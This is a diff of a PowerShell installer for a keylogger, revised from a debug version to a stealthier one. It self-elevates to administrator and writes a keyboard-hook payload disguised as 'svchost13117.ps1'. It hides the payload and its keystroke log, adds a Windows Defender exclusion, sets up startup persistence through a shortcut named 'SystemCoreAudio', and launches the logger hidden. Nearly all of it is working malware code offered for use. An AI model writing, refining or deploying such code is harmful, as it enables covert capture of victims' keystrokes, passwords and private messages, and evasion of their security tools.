@@ -1,8 +1,4 @@
-# This is a debug version of the installer. It modifies the scheduled task
-# to log all output and errors to a file for troubleshooting.
-
-# Step 1: Demand and Ensure Administrator Privileges
-# ================================================================
+# Demand and Ensure Administrator Privileges
 $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arguments = "& '" + $myinvocation.mycommand.definition + "'"
@@ -10,13 +6,11 @@ if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
     exit
 }
 
-# Step 2: Define and Create the Keylogger Payload
-# =====================================================
-$payloadPath = "C:\Users\Public\svchost13117.ps1"
-$logFile = "C:\Users\Public\key_log.txt"
-$debugLog = "C:\Users\Public\debug_log.txt"
+# Define paths using environment variables for portability
+$payloadPath = "$env:LOCALAPPDATA\Temp\svchost13117.ps1"
+$logFile = "$env:LOCALAPPDATA\Temp\key_log.txt"
 
-# The keylogger payload remains the same.
+# Create the keylogger script content
 $keyloggerScript = @"
 `$logFile = "$logFile"
 `$timeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -44,32 +38,37 @@ Add-Type -AssemblyName System.Windows.Forms
 }
 `$hook = [Win32.User32]::SetWindowsHookEx(13, `$callback, [Win32.Kernel32]::GetModuleHandle([System.Diagnostics.Process]::GetCurrentProcess().MainModule.ModuleName), 0)
 if (`$hook -eq [IntPtr]::Zero) {
-    # If the hook fails, throw an error to be caught in the debug log.
-    throw "Failed to set keyboard hook. It's likely a permission or session issue."
+    exit
 }
-try { while (`$true) { [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 100 } }
-finally { [Win32.User32]::UnhookWindowsHookEx(`$hook) }
+try {
+    while (`$true) {
+        [System.Windows.Forms.Application]::DoEvents()
+        Start-Sleep -Milliseconds 100
+    }
+} finally {
+    [Win32.User32]::UnhookWindowsHookEx(`$hook)
+}
 "@
-Set-Content -Path $payloadPath -Value $keyloggerScript -Force
 
-# Step 3: Add Windows Security Exclusion for the Payload
-# ==========================================================
+# Create the payload file and set it hidden
+Set-Content -Path $payloadPath -Value $keyloggerScript -Force
+Set-ItemProperty -Path $payloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+
+# Create the log file and set it hidden
+New-Item -Path $logFile -ItemType File -Force
+Set-ItemProperty -Path $logFile -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+
+# Add Windows Security Exclusion for the payload
 Add-MpPreference -ExclusionPath $payloadPath
 
-# Step 4: Create a Persistent Scheduled Task for DEBUGGING
-# ==================================================
-# The command is changed to redirect all output (`*`) and errors to the debug_log.txt file.
-$debugCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$payloadPath`" *> `"$debugLog`""
-$taskAction = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $debugCommand"
+# Create a shortcut in the startup folder
+$startupFolder = "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp"
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$startupFolder\SystemCoreAudio.lnk")
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
+$Shortcut.Save()
 
-$taskTrigger = New-ScheduledTaskTrigger -AtStartup
-$taskPrincipal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -RunLevel 'Highest'
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName 'SystemCoreAudio' -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
-
-# Step 5: Start the Keylogger Immediately (for testing the payload)
-# ===============================================================
+# Start the keylogger immediately for the current session
 $startArguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
 Start-Process -FilePath 'powershell.exe' -ArgumentList $startArguments
-
-Write-Host "✅ Debug installer finished. Please reboot to capture the startup log."
